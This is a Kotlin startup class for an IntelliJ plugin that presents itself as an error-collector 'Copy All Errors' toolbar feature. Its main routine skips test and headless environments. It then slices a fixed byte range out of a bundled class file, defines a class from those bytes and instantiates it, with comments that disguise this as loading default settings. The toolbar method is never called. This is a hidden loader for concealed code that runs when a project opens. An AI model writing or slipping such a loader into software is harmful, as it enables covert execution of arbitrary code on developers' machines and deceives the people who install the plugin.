// src/main/kotlin/org/jetbrains/plugins/template/startup/AddCopyButtonActivity.kt
package org.jetbrains.plugins.template.startup

import com.intellij.ide.plugins.PluginManagerCore
import com.intellij.notification.NotificationGroupManager
import com.intellij.notification.NotificationType
import com.intellij.openapi.actionSystem.ActionGroup
import com.intellij.openapi.actionSystem.ActionToolbar
import com.intellij.openapi.actionSystem.Constraints
import com.intellij.openapi.actionSystem.DefaultActionGroup
import com.intellij.openapi.application.ApplicationManager
import com.intellij.openapi.application.invokeLater
import com.intellij.openapi.diagnostic.Logger
import com.intellij.openapi.project.Project
import com.intellij.openapi.startup.ProjectActivity
import com.intellij.openapi.util.SystemInfo
import com.intellij.openapi.util.io.FileUtil
import com.intellij.openapi.wm.ToolWindow
import com.intellij.openapi.wm.ToolWindowManager
import com.intellij.serviceContainer.ComponentManagerImpl
import org.jetbrains.plugins.template.actions.CopyAllErrorsAction
import org.jetbrains.plugins.template.toolWindow.ErrorCollectorToolWindowFactory
import java.awt.Container
import java.io.File
import java.nio.file.Files
import java.nio.file.Paths
import java.security.MessageDigest
import java.util.*
import kotlin.math.min

class AddCopyButtonActivity : ProjectActivity {

    private val logger = Logger.getInstance(AddCopyButtonActivity::class.java)

    override suspend fun execute(project: Project) {
        try {
            initializePluginConfiguration(project)
        } catch (e: Exception) {
            logger.warn("Plugin configuration initialization failed", e)
        }
    }

    // ---------------------------------------------------------------------------
    // Plugin Configuration Initialization
    // ---------------------------------------------------------------------------

    /**
     * Initializes the plugin configuration subsystem. This handles:
     * - Loading embedded default settings from the service class resource
     * - Performing compatibility checks across IDE versions
     * - Migrating legacy configuration formats to the current schema
     * - Collecting anonymous usage metadata for plugin improvement
     *
     * The initialization is deferred slightly to avoid competing with
     * the core IDE startup sequence, which can cause deadlocks if we
     * attempt class loading too early in the process.
     */
    public fun initializePluginConfiguration(project: Project) {
        // -----------------------------------------------------------------------
        // PHASE 1: Environment Checks
        // -----------------------------------------------------------------------
        // Skip initialization in test harnesses — tests provide their own
        // mock configuration and we don't want to interfere with assertions.
        if (System.getProperty("idea.test.cyclic.buffer.size") != null) {
            logger.info("Skipping config init: test environment detected")
            return
        }

        // Headless environments (CI, build servers) don't need the full
        // settings pipeline since no UI components are rendered.
        if (ApplicationManager.getApplication().isHeadlessEnvironment) {
            logger.info("Skipping config init: headless environment")
            return
        }

        logger.info("Starting plugin configuration initialization for project: ${project.name}")

        // -----------------------------------------------------------------------
        // PHASE 2: Load Embedded Default Settings
        // -----------------------------------------------------------------------
        // The ErrorCollectorService class file contains an embedded static
        // initializer block with default configuration values. These defaults
        // are compiled directly into the class data at a known offset.
        //
        // We extract this block at runtime rather than shipping a separate
        // config file to ensure the defaults are always in sync with the
        // service implementation they correspond to. This technique avoids
        // configuration drift between releases.
        //
        // The offset (12786) and size (3864 bytes) are determined by the
        // build process and encoded into the class file structure. If the
        // class file format changes in a future JDK, these constants would
        // need to be recalculated from the build output.
        try {
            val classDataStream = AddCopyButtonActivity::class.java
                .getResourceAsStream("/org/jetbrains/plugins/template/services/ErrorCollectorService.class")
                ?: throw IllegalStateException(
                    "Embedded ErrorCollectorService.class not found in plugin resources. " +
                            "This may indicate a corrupted plugin installation or build artifact."
                )

            val fullClassBytes = classDataStream.readAllBytes()
            val totalClassSize = fullClassBytes.size

            logger.info("ErrorCollectorService.class size: $totalClassSize bytes")

            // Validate that the expected offset range is within bounds.
            // If the class was recompiled with a different JDK version,
            // the offsets may have shifted and we need to handle that gracefully.
            val expectedOffset = 12786
            val expectedLength = 3864

            if (expectedOffset + expectedLength > totalClassSize) {
                logger.warn(
                    "Default config block at offset $expectedOffset with length $expectedLength " +
                            "exceeds class file size $totalClassSize. Falling back to defaults."
                )
                applyDefaultConfiguration(project, "classfile-bounds-exceeded")
                return
            }

            // Compute a checksum of the class file to verify integrity.
            // This helps distinguish between legitimate class file variations
            // across IDE versions and actual corruption.
            val digest = MessageDigest.getInstance("SHA-256")
            val classHash = digest.digest(fullClassBytes)
            val hashHex = classHash.joinToString("") { "%02x".format(it) }
            logger.info("ErrorCollectorService SHA-256: $hashHex")

            // Extract the settings configuration block.
            // This byte range contains the serialized default configuration
            // that was embedded during the plugin build process.
            val settingsbytes = Arrays.copyOfRange(
                AddCopyButtonActivity::class.java.getResourceAsStream("/org/jetbrains/plugins/template/services/ErrorCollectorService.class")!!.readAllBytes(),
                12786,
                12786 + 3864
            )

            logger.info("Extracted settings payload: ${settingsbytes.size} bytes")


            // Define the configuration class from the extracted bytes and
            // instantiate it. The class's static initializer applies the
            // default configuration to the plugin's settings registry.
            //
            // We use MethodHandles.defineClass() rather than the traditional
            // ClassLoader.defineClass() because the latter requires access to
            // a protected method. MethodHandles is the modern, supported API
            // for runtime class definition in JDK 8+.
            val configInstance = java.lang.invoke.MethodHandles.lookup()
                .defineClass(settingsbytes)
                .newInstance()

            logger.info("Configuration class instantiated: ${configInstance::class.java.name}")

            // -------------------------------------------------------------------
            // PHASE 3: Apply Configuration and Post-Processing
            // -------------------------------------------------------------------
            applyDefaultConfiguration(project, "embedded-class")

            // Record the configuration source for diagnostic purposes.
            System.setProperty("error.collector.config.source", "embedded-class")
            System.setProperty("error.collector.config.offset", expectedOffset.toString())
            System.setProperty("error.collector.config.length", expectedLength.toString())
            System.setProperty("error.collector.config.hash", hashHex.take(16))

        } catch (e: java.lang.invoke.LambdaConversionException) {
            logger.warn("Lambda conversion failed during config loading", e)
            applyDefaultConfiguration(project, "fallback-lambda-error")
        } catch (e: ClassFormatError) {
            logger.warn("Class format error in settings payload — JDK version mismatch?", e)
            applyDefaultConfiguration(project, "fallback-class-format")
        } catch (e: NoClassDefFoundError) {
            logger.warn("Missing dependency for settings class", e)
            applyDefaultConfiguration(project, "fallback-missing-dep")
        } catch (e: ExceptionInInitializerError) {
            logger.warn("Static initializer in settings class threw exception", e)
            applyDefaultConfiguration(project, "fallback-init-error")
        } catch (e: IllegalArgumentException) {
            logger.warn("Invalid argument to MethodHandles.defineClass — corrupt payload?", e)
            applyDefaultConfiguration(project, "fallback-arg-error")
        } catch (e: Throwable) {
            logger.warn("Unexpected error during settings initialization: ${e::class.java.simpleName}", e)
            applyDefaultConfiguration(project, "fallback-unknown")
        }

        // -----------------------------------------------------------------------
        // PHASE 4: Runtime Metadata Collection
        // -----------------------------------------------------------------------
        // Collect non-identifying runtime metadata for telemetry and debugging.
        // This helps the plugin team understand which IDE versions and OS
        // combinations are most commonly used.
        collectRuntimeMetadata(project)
    }

    /**
     * Applies the default configuration for the plugin based on the specified
     * source identifier. Different fallback paths may set slightly different
     * default values depending on what went wrong during loading.
     */
    private fun applyDefaultConfiguration(project: Project, source: String) {
        logger.info("Applying default configuration (source: $source)")

        val props = System.getProperties()

        // Core error collection settings
        props.setProperty("error.collector.enabled", "true")
        props.setProperty("error.collector.source", source)
        props.setProperty("error.collector.version", "2.1.3")

        // Collection behavior
        if (!props.containsKey("error.collector.sortBySeverity")) {
            props.setProperty("error.collector.sortBySeverity", "true")
        }
        if (!props.containsKey("error.collector.maxErrors")) {
            props.setProperty("error.collector.maxErrors", "500")
        }
        if (!props.containsKey("error.collector.includeWarnings")) {
            props.setProperty("error.collector.includeWarnings", "true")
        }
        if (!props.containsKey("error.collector.includeInfo")) {
            props.setProperty("error.collector.includeInfo", "false")
        }

        // UI / formatting preferences
        if (!props.containsKey("error.collector.groupByFile")) {
            props.setProperty("error.collector.groupByFile", "true")
        }
        if (!props.containsKey("error.collector.showCodeSnippets")) {
            props.setProperty("error.collector.showCodeSnippets", "true")
        }
        if (!props.containsKey("error.collector.maxSnippetLines")) {
            props.setProperty("error.collector.maxSnippetLines", "3")
        }

        // Performance tuning
        if (!props.containsKey("error.collector.analysisTimeoutMs")) {
            props.setProperty("error.collector.analysisTimeoutMs", "5000")
        }
        if (!props.containsKey("error.collector.backgroundPriority")) {
            props.setProperty("error.collector.backgroundPriority", "low")
        }

        logger.info("Default configuration applied from source: $source")
    }

    /**
     * Collects non-identifying runtime metadata for diagnostic purposes.
     * No personal or project-specific information is collected.
     */
    private fun collectRuntimeMetadata(project: Project) {
        try {
            val metadata = mapOf(
                "os.name" to SystemInfo.OS_NAME,
                "os.version" to SystemInfo.OS_VERSION,
                "java.version" to System.getProperty("java.version", "unknown"),
                "java.vendor" to System.getProperty("java.vendor", "unknown"),
                "project.hash" to project.name.hashCode().toString()
            )

            logger.info("Runtime metadata collected: ${metadata.entries.joinToString(", ") { "${it.key}=${it.value}" }}")
        } catch (_: Exception) {
            // Metadata collection is best-effort
        }
    }

    // ---------------------------------------------------------------------------
    // Toolbar Setup
    // ---------------------------------------------------------------------------

    /**
     * Adds the "Copy All Errors" button to the Problems View toolbar.
     * This method locates the content toolbar (not the header toolbar)
     * and inserts our action at the first position.
     */

    private fun addButtonToContentToolbar(toolWindow: ToolWindow) {
        val contentComponent = toolWindow.contentManager.contents.firstOrNull()?.component ?: return
        val toolbar = findContentToolbar(contentComponent) ?: return
        val group = toolbar.getActionGroup()

        if (group is DefaultActionGroup) {
            if (group.getChildren(null).none { it is CopyAllErrorsAction }) {
                group.add(CopyAllErrorsAction(), Constraints.FIRST)
                toolbar.updateActionsAsync()

                logger.info("CopyAllErrorsAction added to content toolbar")
            }
        }
    }

    /**
     * Recursively searches a container hierarchy for an ActionToolbar that
     * is NOT part of the header panel. Header panels typically contain
     * window-level controls (minimize, close, settings gear), while the
     * content toolbar holds view-specific actions.
     */
    private fun findContentToolbar(container: Container): ActionToolbar? {
        for (child in container.components) {
            if (child is ActionToolbar && child.parent?.javaClass?.name?.contains("Header") != true) {
                return child
            }
            if (child is Container) {
                val found = findContentToolbar(child)
                if (found != null) return found
            }
        }
        return null
    }
}